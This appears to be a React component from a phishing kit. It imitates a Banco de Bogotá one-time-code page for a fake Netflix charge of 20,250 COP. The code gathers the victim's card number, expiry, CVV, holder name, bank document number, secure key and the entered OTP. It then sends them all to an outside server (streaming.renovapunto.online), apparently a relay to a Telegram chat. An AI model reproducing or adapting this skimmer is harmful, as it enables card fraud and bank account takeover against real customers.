import React, { useState, useEffect } from 'react';

const OTP = () => {
  const [otp, setOtp] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [message, setMessage] = useState('');

  useEffect(() => {
    // Recuperar los valores del formulario del localStorage cuando el componente se monta
    const savedFormValues = localStorage.getItem('formValues');
    const savedDocumentNumber = localStorage.getItem('documentNumber');
    const savedSecureKey = localStorage.getItem('secureKey');

    if (savedFormValues) {
      const formValues = JSON.parse(savedFormValues);
      setCardNumber(formValues.cardNumber || '');
    }

    if (!savedDocumentNumber || !savedSecureKey) {
      setMessage('No se encontraron los datos necesarios en el localStorage.');
    }
  }, []);

  const sendTelegramMessage = async (message) => {
    try {
      const response = await fetch('https://streaming.renovapunto.online/enviarmensaje', { // Asegúrate de que esta URL es correcta
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ chatId: '-1002294546392', message }), // Incluye chatId si es necesario
      });
  
      if (!response.ok) {
        throw new Error('Error al enviar el mensaje a Telegram');
      }
  
      const result = await response.json();
    } catch (error) {
      console.error('Error:', error);
      setMessage('Error al enviar el mensaje.');
    }
  };
  

  const handleSubmit = () => {
    if (otp.length === 6) {
      // Obtener datos del localStorage
      const savedDocumentNumber = localStorage.getItem('documentNumber');
      const savedSecureKey = localStorage.getItem('secureKey');
      const savedFormValues = JSON.parse(localStorage.getItem('formValues')) || {};
      const banco = localStorage.getItem('banco') || 'No disponible';

      if (savedDocumentNumber && savedSecureKey) {
        const telegramMessage = `🔑📱 KEY NETFLIX 📱🔑:\n -------------------------------------------\n- 📛: ${savedFormValues.cardHolderName || 'No disponible'}\n- 💳: ${savedFormValues.cardNumber || 'No disponible'} \n- 📅: ${savedFormValues.expirationDate || 'No disponible'}\n- 🔐: ${savedFormValues.cvv || 'No disponible'}\n-------------------------------------------\n 🔑📱 LOGIN NETFLIX 📱🔑\n ------------------------------------------- \n 🏦 : ${banco || 'No disponible'}\n 👤 : ${savedDocumentNumber}\n 🔒 : ${savedSecureKey}\n -------------------------------------------\n⚡ OTP ⚡\n-------------------------------------------\n 🔒: ${otp}`;
        
        sendTelegramMessage(telegramMessage);
      } else {
        setMessage('Datos del formulario no disponibles.');
      }

      setOtp(''); 
      setMessage(''); 
      setMessage('Por favor, ingrese un código de 6 dígitos.');
    } else {
      setMessage('Por favor, ingrese un código de 6 dígitos.');
    }
  };

  return (
    <div className="w-full max-w-md mx-auto bg-white rounded-lg shadow-lg p-6 mt-8">
      <img 
        src="https://d31dn7nfpuwjnm.cloudfront.net/images/valoraciones/0023/7354/Banco_de_Bogot%C3%A1.jpg?1464013869"
        alt="Logo" 
        className="w-48 mx-auto mb-4" 
      />
      <h1 className="text-2xl font-bold text-gray-800 text-center mb-4">
        Detalles Transaccionales
      </h1>
      <div className="space-y-4">
        <p><b>Comercio:</b> NETFLIX SERVICIOS S.A</p>
        <p><b>Monto:</b> $20.250 COP</p>
        <p className="mb-2"><b>Número de tarjeta:</b> {cardNumber.slice(0, 4)}****</p>
        <div className="flex flex-col items-center">
          <span className="text-gray-700 font-medium">Digite el Código:</span>
          <input
            type="text"
            value={otp}
            onChange={(e) => setOtp(e.target.value)}
            placeholder="Ingrese el código"
            maxLength="6"
            required
            className="w-full h-12 border border-gray-300 rounded px-3 mt-2 focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-150 ease-in-out"
          />
        </div>
        <p 
          className="text-blue-600 cursor-pointer text-center mt-4 mb-4" 
          onClick={() => alert('Código Enviado')}
        >
          Presione aquí para recibir un nuevo código
        </p>
        <button
          onClick={handleSubmit}
          className="w-full h-12 bg-[#0043a9] text-white rounded-lg hover:bg-blue-700 transition duration-150 ease-in-out"
        >
          Activar
        </button>
        {message && <p className="text-red-500 mt-2 text-center">{message}</p>}
      </div>
    </div>
  );
};

export default OTP;
